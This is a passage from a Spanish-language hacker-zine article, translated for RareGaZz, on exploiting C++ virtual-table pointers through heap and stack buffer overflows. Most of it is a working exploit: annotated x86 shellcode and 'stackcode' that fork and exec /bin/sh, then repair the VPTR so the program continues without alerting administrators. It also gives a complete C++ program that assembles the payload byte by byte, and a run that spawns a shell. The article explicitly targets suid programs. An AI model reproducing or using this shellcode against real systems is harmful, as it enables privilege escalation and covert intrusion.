Program received signal SIGTRAP, Trace/breakpoint trap.
0x8049b58 in ?? ()

Recibimos bien una SIGTRAP, provocada por la instruccion precediendo la
direccion 0x8049b58. Sin embargo, la direccion de nuestro objeto fue
0x8049b38.
0x8049b58-1-0x8049b38=0x1F (=31), que es exactamente el offset de nuestro
CCh en nuestro buffer. Por lo tanto, es tambien nuestro CCh que ha sido
ejecutado!!!
Lo has entendido, ahora podemos reemplazar nuestro simple codigo CCh, por
un shellcode peque~o, para obtener algunos resultados mas interesantes,
especialmente si nuestro programa bo3 es suid... ;)


Algunas variaciones acerca del metodo
=====================================
Hemos explicado aqui el mecanismo explotable mas simple.
Otros casos mas complejos pueden aparecer posiblemente...
Por ejemplo, podemos tener asociaciones entre classes como esta:

class MyClass3 { 
private:
 char Buffer3[32];
 MyClass1 *PtrObjectClass;
public:
 virtual void Function1() {
  ...
  PtrObjectClass1->PrintBuffer();
  ...
 }
};

En este caso, tenemos una relacion entre 2 classes llamada "link por
referencia".  Nuestra class MyClass3 contiene un puntero a otra class.
Si overfloweamos el buffer en la class MyClass3, podemos sobreescribir
el puntero PtrObjectClass. Solo podemos necesitar buscar un puntero
suplementario ;)


 +----------------------------------------------------+
 |                                                    |
 +-> VTABLE_MyClass3: IIIIIIIIIIIIRRRR                |
                                                     =+==
MyClass3 object: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPPPPXXXX
                                                 ==+=
                                                   |
 +---------------------<---------------------------+
 |
 +--> MyClass1 object: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCYYYY
                                                       ==+=
                                                         |
 +-------------------------------------------------------+
 |
 +--> VTABLE_MyClass1: IIIIIIIIIIIIQQQQ

Donde: B representa bytes del Buffer de MyClass4.
       C representa bytes del Buffer de MyClass1.
       P representa bytes de un puntero a la class objeto MyClass1.
       X representa bytes del posible VPTR de la class objeto MyClass4.
        (no es necesario tener un VPTR en la class conteniendo el puntero).
       Y representa bytes del VPTR de la class objeto MyClass1.

Esta tecnica no depende aqui de la estructura de la class interna para
el compilador (offset de VPTR), sino depende de la estructura de la class
definida por el programador, y asi puede incluso ser explotado en programas
viniendo de compiladores ubicando el VPTR al comienzo del objeto en memoria
(por ejemplo Visual C++).
Ademas, en este caso, la class objeto MyClass3 posiblemente ha sido creada
en la pila (objeto local), que hace que la localizacion sea mucho mas facil,
siendo dada que la direccion del objeto sera probablemente arreglada. Sin
embargo, en este caso, sera necesario que nuestra pila sea ejecutable,
y no nuestro heap como previamente.

Conocemos como encontrar los valores para 2 de los 3 parametros de nuestra
funcion BufferOverflow() (numero de direcciones VTABLE, y offset del VPTR).
Efectivamente estos 2 parametros puede ser encontrados facilmente en debuggear
el codigo del programa, y ademas, su valor es arreglado desde la ejecucion
a otro. Por otro lado, el 1er parametro (direccion del objeto en memoria),
es mas dificil de establecer. En realidad, necesitamos esta direccion solo
porque queremos ubicar la VTABLE que creamos dentro del buffer.


----|  Un ejemplo particular

Supongamos que tenemos una class cuya ultima variable es un buffer
explotable.  Esto significa que si llenamos este buffer (por ejemplo de
N bytes de tama~o), con N + 4 bytes, sabemos que no tenemos que modificar
nada en el espacio de memoria del proceso que contiene nuestro buffer,
el VPTR, y el byte siguiendo nuestro VPTR (por el caracter 00h).
Quizas podamos tomar ventaja de esta situacion.  Pero como?  Vamos a usar
el buffer, para cargar un shellcode, y a continuacion para seguir la
ejecucion del programa!  La ventaja sera enorme, ya que el programa
no puede ser terminado brutalmente, y asi no alertara de alguien controlando
eventualmente o logueando su ejecucion (administradores...).

Es posible?
Puede ser necesario ejecutar primero nuestro shellcode, para re-escribir
una cadena en nuestro buffer, y para restaurar la pila en el estado
inicial (justo antes de la llamada a nuestro metodo).  Luego, puede solo
recordarnos de rellamar al metodo inicial, por lo que el programa
continua normalmente.

Aqui hay varias remarcaciones y problemas que vamos a encontrar:
- es necesario re-escribir completamente nuestro buffer (por lo que la
 continuacion de la ejecucion usa valores apropiados), y por consiguiente
 para sobreescribir nuestro propio shellcode.
 Para evitarlo, vamos a copiar una parte de nuestro shellcode (la parte
 mas peque~a posible ) a otro lugar en memoria.
 En este caso vamos a copiar parte de nuestro shellcode a la pila (llamaremos
 a esta parte de codigo "stackcode"). No deberia poseer ningunos problemas
 particulares si nuestra pila es ejecutable.
- Hemos mencionado antes un "manejo extra~o", que consistia en agregar un
 offset de la direccion de nuestro objeto, y ubicar este resultado en
 la pila, que proveia el puntero This para el metodo ejecutado.
 El problema es, que aqui, el offset que va a ser agregado a la direccion
 de nuestro objeto va a ser tomado en nuestra VTABLE, y que este offset
 no puede ser 0 (porque no podemos tener 00h bytes en nuestro buffer).
 Vamos a elegir un valor arbitrario para este offset, que ubicaremos en
 nuestra VTABLE, y corregiremos el valor This en la pila luego, con una
 resta correspondiente.
- vamos a hacer un fork () en nuestro proceso, para cargar la ejecucion
 del shell (exec ()), y esperar su terminacion (wait ()), para continuar
 nuestra ejecucion del programa principal.
- la direccion donde continuaremos nuestra ejecucion es constate, porque
 es la direccion del metodo original (presente en la VTABLE de nuestra
 class relativa de nuestro objeto).
- sabemos que podemos usar nuestro registro EAX, porque este puede ser
 sobreescrito en cualquier caso por nuestro valor de retorno de metodo.
- no podemos incluir ningun 00h byte en nuestro buffer. Luego deberiamos
 regenerar estos bytes (necesario para nuestros strings) en tiempo de
 ejecucion.

Mientras aplicamos todos estos puntos importantes, vamos a tratar de
construir un buffer de acuerdo al siguiente diagrama:

 +------------------------------------<-(1)---------------------------------+
 |   our VTABLE                                                             |
=+===================                                                     ==+=
9999TT999999.... MMMM SSSS0000/bin/shAAA.... A BBB... Bnewstring99999.... VVVVL
                 ==+= ==+=    |      |       | ========
                   |    |     |      |       |      \
                   |    +-->--+      |       |        \(una copia en la pila)
		   |                 |       |      ========
		   +---(2)-->--------+       |      BBB... B
                                             |      |      |
                                             +-(3)->+      +--> metodo antiguo

Donde: 9 representa bytes NOP (90h).
       T representa bytes formando la word del offset que seran agregados
        al puntero en la pila (manejo extra~o ;).
       M representa la direccion en nuestro buffer del comienzo de nuestro
        shellcode.
       S representa la direccion en nuestro buffer del string "/bin/sh".
       0 representa 90h bytes, que sera inicializado a 00h en tiempo de
        ejecucion (necesario para exec ()).
       /bin/sh representa el string "/bin/sh", sin ningun byte con terminacion
        00h.
       A representa un byte de nuestro shellcode (principalmente para correr
        el shell, luego para copiar el stackcode en la pila y ejecutarlo).
       B representa un byte de nuestro stackcode (principalmente para resetear
        nuestro buffer con un nuevo string, y para ejecutar el metodo original
        para continuar la ejecucion del programa original.
       newstring representa el string "newstring", que sera recopiado en
        el buffer despues de la ejecucion del shell, para continuar la
        ejecucion.
       V representa un byte del VPTR, que debe apuntar al comienzo de
        nuestro buffer (para nuestra VTABLE).
       L representa el byte que sera copiado despues del VPTR, y que sera
        un byte 0hh.

En una manera mas detallada, aqui esta el contenido de nuestro shellcode
y stackcode:


pushl  %ebp                             //guardar el EBP existente
movl   %esp,%ebp                        //creacion del stack frame
xorl   %eax,%eax                        //EAX=0
movb   $0x31,%al                        //EAX=$StackCodeSize (tama~o del
                                        // codigo que sera copiado a la pila)
subl   %eax,%esp                        //creacion de una variable local para
                                        // contener nuestro stackcode
pushl  %edi
pushl  %esi
pushl  %edx
pushl  %ecx
pushl  %ebx                             //guardar registros
pushf                                   //guardar flags
cld                                     //direccion flag=incrementation
xorl   %eax,%eax                        //EAX=0
movw   $0x101,%ax                       //EAX=$AddThis (valor agregado para
                                        // calcular This en la pila)
subl   %eax,0x8(%ebp)                   //restamos este valor del valor
                                        // This actual en la pila, para
                                        // restaurar el This original.
xorl   %eax,%eax                        //EAX=0
movl   $0x804a874,%edi                  //EDI=$BufferAddress+$NullOffset
                                        // (direccion del dword NULL en
                                        // nuestro buffer)
stosl  %eax,%es:(%edi)                  //escribimos este NULL en el buffer
movl   $0x804a87f,%edi                  //EDI=$BufferAddress+$BinSh00Offset
                                        // (direccion de 00h desde "/bin/sh")
stosb  %al,%es:(%edi)                   //escribimos este 00h al final de
                                        // "/bin/sh"
movb   $0x2,%al
int    $0x80                            //fork()
xorl   %edx,%edx                        //EDX=0
cmpl   %edx,%eax
jne    0x804a8c1                        //si EAX=0 entonces saltar a LFATHER
                                        // (EAX=0 si es proceso padre)

movb   $0xb,%al                         //sino somos el proceso child
movl   $0x804a878,%ebx                  //EBX=$BufferAddress+$BinShOffset
                                        // (direccion de "/bin/sh")
movl   $0x804a870,%ecx			//ECX=$BufferAddress+$BinShAddressOffset
                                        //(direccion de direccion de "/bin/sh")
xorl   %edx,%edx                        //EDX=0h (NULL)
int    $0x80                            //exec() "/bin/sh"

LFATHER:
movl   %edx,%esi                        //ESI=0
movl   %edx,%ecx			//ECX=0
movl   %edx,%ebx			//EBX=0
notl   %ebx				//EBX=0xFFFFFFFF
movl   %edx,%eax			//EAX=0
movb   $0x72,%al			//EAX=0x72
int    $0x80                            //wait() (esperar exit del shell)
xorl   %ecx,%ecx			//ECX=0
movb   $0x31,%cl			//ECX=$StackCodeSize
movl   $0x804a8e2,%esi			//ESI=$BufferAddress+$StackCodeOffset
                                        // (direccion del comienzo del
                                        // stackcode)
movl   %ebp,%edi                        //EDI apunta al final de o variable
                                        // local
subl   %ecx,%edi                        //EDI apunta al comienzo de o
                                        // variable local
movl   %edi,%edx                        //EDX tambien apunta al comienzo de
                                        // o variable local
repz movsb %ds:(%esi),%es:(%edi)        //copia nuestro stackcode en tu
                                        // variable local en la stack
jmp    *%edx                            //correr nuestro stackcode en la pila

stackcode:
movl   $0x804a913,%esi			//ESI=$BufferAddress+$NewBufferOffset
                                        // (apunta al nuevo string que
                                        // queremos re-escribir en el buffer)
movl   $0x804a860,%edi                  //EDI=$BufferAddress (apunta al
                                        // comienzo de nuestro buffer)
xorl   %ecx,%ecx			//ECX=0
movb   $0x9,%cl                         //ECX=$NewBufferSize (largo del
                                        // nuevo string)
repz movsb %ds:(%esi),%es:(%edi)        //copia el nuevo string al
                                        // comienzo de nuestro buffer
xorb   %al,%al				//AL=0
stosb  %al,%es:(%edi)                   //poner un 00h al final del string
movl   $0x804a960,%edi			//EDI=$BufferAddress+$VPTROffset
                                        // (direccion de VPTR)
movl   $0x8049730,%eax                  //EAX=$VTABLEAddress (direccion de la
                                        // VTABLE original desde nuestra class)
movl   %eax,%ebx			//EBX=$VTABLEAddress
stosl  %eax,%es:(%edi)                  //corregir el VPTR para apuntar a la
                                        // VTABLE original
movb   $0x29,%al                        //AL=$LastByte (byte siguiendo el
                                        // VPTR en memoria)
stosb  %al,%es:(%edi)                   //corregir este byte
movl   0xc(%ebx),%eax			//EAX=*VTABLEAddress+IAddress*4
                                        // (EAX toma la direccion del
                                        // metodo original en la VTABLE
                                        // original).
popf
popl   %ebx
popl   %ecx
popl   %edx
popl   %esi
popl   %edi                             //restaurar flags y registros
movl   %ebp,%esp
popl   %ebp                             //destruir el stack frame
jmp    *%eax                            //ejecutar el metodo original

Ahora debemos codear una funcion BufferOverflow() que nos va a "compilar"
el shellcode y el stackcode, y para crear la estructura de nuestro buffer.
Aqui hay parametros que deberiamos pasar a esta funcion:
- BufferAddress = direccion de nuestro buffer en memoria.
- IAddress = indice en la VTABLE del 1er metodo que sera ejecutado.
- VPTROffset = offset en nuestro buffer del VPTR a sobreescribir.
- AddThis = valor que sera agregado al puntero This en la pila, por el
"manejo extra~o".
- VTABLEAddress = direccion de la VTABLE original de nuestra class (codeada
en el ejecutable).
- *NewBuffer = un puntero a la nueva cadena que queremos ubicar en nuestro
buffer para continuar normalmente el programa.
- LastByte = el byte original siguiendo el VPTR en memoria, que es
 sobreescrito en el tiempo de la copia de nuestro buffer en el buffer
 original, por el 00h.

Aqui esta el codigo resultante del programa (bo4.cpp):


#include <stdio.h>
#include <string.h>
#include <malloc.h>

#define BUFFERSIZE 256

class BaseClass { 
private:
 char Buffer[BUFFERSIZE];
public:
 void SetBuffer(char *String) {
  strcpy(Buffer,String);
 }
 virtual void PrintBuffer() {
  printf("%s\n",Buffer);
 }
};

class MyClass1:public BaseClass {
public:
 void PrintBuffer() {
  printf("MyClass1: ");
  BaseClass::PrintBuffer();
 }
};

class MyClass2:public BaseClass {
public:
 void PrintBuffer() {
  printf("MyClass2: ");
  BaseClass::PrintBuffer();
 }
};

char *BufferOverflow(unsigned long BufferAddress,int IAddress,int VPTROffset,
 unsigned short AddThis,unsigned long VTABLEAddress,char *NewBuffer,char LastByte) {

 char *CBuf;
 unsigned long *LBuf;
 unsigned short *SBuf;
 char BinShSize,ShellCodeSize,StackCodeSize,NewBufferSize;
 unsigned long i,  
  MethodAddressOffset,BinShAddressOffset,NullOffset,BinShOffset,BinSh00Offset,
  ShellCodeOffset,StackCodeOffset,
  NewBufferOffset,NewBuffer00Offset,
  LastByteOffset;  
 char *BinSh="/bin/sh";
 
 CBuf=(char*)malloc(VPTROffset+4+1);
 LBuf=(unsigned long*)CBuf;
 
 BinShSize=(char)strlen(BinSh);
 ShellCodeSize=0x62;
 StackCodeSize=0x91+2-0x62;
 NewBufferSize=(char)strlen(NewBuffer);
 
 MethodAddressOffset=IAddress*4;
 BinShAddressOffset=MethodAddressOffset+4;
 NullOffset=MethodAddressOffset+8;
 BinShOffset=MethodAddressOffset+12;
 BinSh00Offset=BinShOffset+(unsigned long)BinShSize;
 ShellCodeOffset=BinSh00Offset+1;
 StackCodeOffset=ShellCodeOffset+(unsigned long)ShellCodeSize;
 NewBufferOffset=StackCodeOffset+(unsigned long)StackCodeSize;
 NewBuffer00Offset=NewBufferOffset+(unsigned long)NewBufferSize;
 LastByteOffset=VPTROffset+4;

 for (i=0;i<VPTROffset;i++) CBuf[i]='\x90'; //NOPs
 SBuf=(unsigned short*)&LBuf[2];
 *SBuf=AddThis; //added  to the This pointer on the stack
 
 LBuf=(unsigned long*)&CBuf[MethodAddressOffset];
 *LBuf=BufferAddress+ShellCodeOffset; //shellcode's address
 
 LBuf=(unsigned long*)&CBuf[BinShAddressOffset];
 *LBuf=BufferAddress+BinShOffset; //address of "/bin/sh"

 memcpy(&CBuf[BinShOffset],BinSh,BinShSize); //"/bin/sh" string

 //shellcode:
  
 i=ShellCodeOffset;
 CBuf[i++]='\x55';                                   //pushl %ebp
 CBuf[i++]='\x89';CBuf[i++]='\xE5';                  //movl %esp,%ebp
 CBuf[i++]='\x31';CBuf[i++]='\xC0';                  //xorl %eax,%eax
 CBuf[i++]='\xB0';CBuf[i++]=StackCodeSize;           //movb $StackCodeSize,%al
 CBuf[i++]='\x29';CBuf[i++]='\xC4';                  //subl %eax,%esp
 
 CBuf[i++]='\x57';                                   //pushl %edi
 CBuf[i++]='\x56';                                   //pushl %esi
 CBuf[i++]='\x52';                                   //pushl %edx 
 CBuf[i++]='\x51';                                   //pushl %ecx 
 CBuf[i++]='\x53';                                   //pushl %ebx  
 CBuf[i++]='\x9C';                                   //pushf
 
 CBuf[i++]='\xFC';                                   //cld

 CBuf[i++]='\x31';CBuf[i++]='\xC0';                  //xorl %eax,%eax
 CBuf[i++]='\x66';CBuf[i++]='\xB8';                  //movw $AddThis,%ax
 SBuf=(unsigned short*)&CBuf[i];*SBuf=AddThis;i=i+2;
 CBuf[i++]='\x29';CBuf[i++]='\x45';CBuf[i++]='\x08'; //subl %eax,0x8(%ebp)

 CBuf[i++]='\x31';CBuf[i++]='\xC0';                  //xorl %eax,%eax
 
 CBuf[i++]='\xBF';                        //movl $BufferAddress+$NullOffset,%edi
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+NullOffset;i=i+4;  
 CBuf[i++]='\xAB';                                   //stosl %eax,%es:(%edi)

 CBuf[i++]='\xBF';                     //movl $BufferAddress+$BinSh00Offset,%edi
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+BinSh00Offset;i=i+4;
 CBuf[i++]='\xAA';                                   //stosb %al,%es:(%edi)

 CBuf[i++]='\xB0';CBuf[i++]='\x02';                  //movb $0x2,%al
 CBuf[i++]='\xCD';CBuf[i++]='\x80';                  //int $0x80 (fork())
 
 CBuf[i++]='\x31';CBuf[i++]='\xD2';                  //xorl %edx,%edx
 CBuf[i++]='\x39';CBuf[i++]='\xD0';                  //cmpl %edx,%eax
 CBuf[i++]='\x75';CBuf[i++]='\x10';                  //jnz +$0x10 (-> LFATHER)

 CBuf[i++]='\xB0';CBuf[i++]='\x0B';                  //movb $0xB,%al
 CBuf[i++]='\xBB';                       //movl $BufferAddress+$BinShOffset,%ebx
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+BinShOffset;i=i+4; 
 CBuf[i++]='\xB9';                //movl $BufferAddress+$BinShAddressOffset,%ecx
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+BinShAddressOffset;i=i+4; 
 CBuf[i++]='\x31';CBuf[i++]='\xD2';                  //xorl %edx,%edx
 CBuf[i++]='\xCD';CBuf[i++]='\x80';                  //int $0x80 (execve())
 
                                                     //LFATHER:
 CBuf[i++]='\x89';CBuf[i++]='\xD6';                  //movl %edx,%esi
 CBuf[i++]='\x89';CBuf[i++]='\xD1';                  //movl %edx,%ecx
 CBuf[i++]='\x89';CBuf[i++]='\xD3';                  //movl %edx,%ebx
 CBuf[i++]='\xF7';CBuf[i++]='\xD3';                  //notl %ebx
 CBuf[i++]='\x89';CBuf[i++]='\xD0';                  //movl %edx,%eax
 CBuf[i++]='\xB0';CBuf[i++]='\x72';                  //movb $0x72,%al
 CBuf[i++]='\xCD';CBuf[i++]='\x80';                  //int $0x80 (wait())
 
 CBuf[i++]='\x31';CBuf[i++]='\xC9';                  //xorl %ecx,%ecx
 CBuf[i++]='\xB1';CBuf[i++]=StackCodeSize;           //movb $StackCodeSize,%cl

 CBuf[i++]='\xBE';                   //movl $BufferAddress+$StackCodeOffset,%esi
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+StackCodeOffset;i=i+4; 

 CBuf[i++]='\x89';CBuf[i++]='\xEF';                  //movl %ebp,%edi
 CBuf[i++]='\x29';CBuf[i++]='\xCF';                  //subl %ecx,%edi
 CBuf[i++]='\x89';CBuf[i++]='\xFA';                  //movl %edi,%edx
 
 CBuf[i++]='\xF3';CBuf[i++]='\xA4';           //repz movsb %ds:(%esi),%es:(%edi)

 CBuf[i++]='\xFF';CBuf[i++]='\xE2';                  //jmp *%edx (stackcode)

 //stackcode:
 
 CBuf[i++]='\xBE';                   //movl $BufferAddress+$NewBufferOffset,%esi
 
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+NewBufferOffset;i=i+4; 
 CBuf[i++]='\xBF';                                   //movl $BufferAddress,%edi
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress;i=i+4; 
 CBuf[i++]='\x31';CBuf[i++]='\xC9';                  //xorl %ecx,%ecx
 CBuf[i++]='\xB1';CBuf[i++]=NewBufferSize;           //movb $NewBufferSize,%cl
 CBuf[i++]='\xF3';CBuf[i++]='\xA4';           //repz movsb %ds:(%esi),%es:(%edi)

 CBuf[i++]='\x30';CBuf[i++]='\xC0';                  //xorb %al,%al
 CBuf[i++]='\xAA';                                   //stosb %al,%es:(%edi)

 CBuf[i++]='\xBF';                        //movl $BufferAddress+$VPTROffset,%edi
 LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+VPTROffset;i=i+4; 
 CBuf[i++]='\xB8';                                   //movl $VTABLEAddress,%eax
 LBuf=(unsigned long*)&CBuf[i];*LBuf=VTABLEAddress;i=i+4; 
 CBuf[i++]='\x89';CBuf[i++]='\xC3';                  //movl %eax,%ebx
 CBuf[i++]='\xAB';                                   //stosl %eax,%es:(%edi)

 CBuf[i++]='\xB0';CBuf[i++]=LastByte;                //movb $LastByte,%al
 CBuf[i++]='\xAA';                                   //stosb %al,%es:(%edi)

 CBuf[i++]='\x8B';CBuf[i++]='\x43';
 CBuf[i++]=(char)4*IAddress;                       //movl $4*Iaddress(%ebx),%eax

 CBuf[i++]='\x9D';                                   //popf
 CBuf[i++]='\x5B';                                   //popl %ebx
 CBuf[i++]='\x59';                                   //popl %ecx
 CBuf[i++]='\x5A';                                   //popl %edx
 CBuf[i++]='\x5E';                                   //popl %esi
 CBuf[i++]='\x5F';                                   //popl %edi

 CBuf[i++]='\x89';CBuf[i++]='\xEC';                  //movl %ebp,%esp
 CBuf[i++]='\x5D';                                   //popl %ebp
 
 CBuf[i++]='\xFF';CBuf[i++]='\xE0';                  //jmp *%eax
 
 memcpy(&CBuf[NewBufferOffset],NewBuffer,(unsigned long)NewBufferSize);
  //inserta el nuevo string en el buffer
 
 LBuf=(unsigned long*)&CBuf[VPTROffset];
 *LBuf=BufferAddress; //direccion de nuestra VTABLE

 CBuf[LastByteOffset]=0; //ultimo byte (para strcpy())

 return CBuf;
}

void main() {
 BaseClass *Object[2];
 unsigned long *VTABLEAddress;

 Object[0]=new MyClass1;
 Object[1]=new MyClass2; 

 printf("Object[0] address = %X\n",(unsigned long)&(*Object[0])); 
 VTABLEAddress=(unsigned long*) ((char*)&(*Object[0])+256);
 printf("VTable address = %X\n",*VTABLEAddress);
 
 Object[0]->SetBuffer(BufferOverflow((unsigned long)&(*Object[0]),3,BUFFERSIZE,
  0x0101,*VTABLEAddress,"newstring",0x29)); 
  
 Object[1]->SetBuffer("string2");
 Object[0]->PrintBuffer();
 Object[1]->PrintBuffer();
}


Ahora, estamos listos para compilar y chequear...

rix@pentium:~/BO > gcc -o bo4 bo4.cpp
rix@pentium:~/BO > bo4
adresse Object[0] = 804A860
adresse VTable = 8049730
sh-2.02$ exit
exit
MyClass1: newstring
MyClass2: string2
rix@pentium:~/BO >

Y como preveimos, nuestro shellcode se ejecuta en si mismo, entonces el
programa continua su ejecucion, con un nuevo string en el buffer
("newstring")!!!


Conclusion
==========
Para resumir, notemos que la tecnica base requiere las siguientes condiciones
para el exito:
- un buffer de un cierto tama~o minimo
- programa suid
- heap ejecutable y/o stack ejecutable (de acuerdo a tecnicas)
- para saber la direccion del comienzo del buffer (en el heap o en la pila)
- para saber el offset desde el comienzo del buffer del VPTR (arreglado
   para todas las ejecuciones)
- para saber el offset en la VTABLE del puntero del 1er metodo ejecutado
   despues del overflow (arreglado para todas las ejecuciones)
- para saber la direccion de la VTABLE si queremos continuar la ejecucion
   del programa correctamente.

Espero que este articulo te muestre de nuevo como los punteros (mas y mas
usados en programacion moderna ) pueden ser muy peligrosos en algunos casos
particulares.

Notamos que algunos lenguajes tan particulares como C++, siempre incluyen
algunas debilidades, y que este no es por un lenguaje particular o
herramientas que vuelven seguro a un programa, sino principalmente por
el conocimiento y habilidad de sus concebidores...

Gracias a: route, klog, mayhem, nite, darkbug.

|EOF|-------------------------------------------------------------------------|


 Traducido por Active Matrix - schyzophrenia@gmx.net
 Para RareGaZz - http://www.raregazz.com.ar - http://raregazz.cjb.net
 Argentina, 2002
 El articulo aqui traducido, mantiene los derechos de autor.

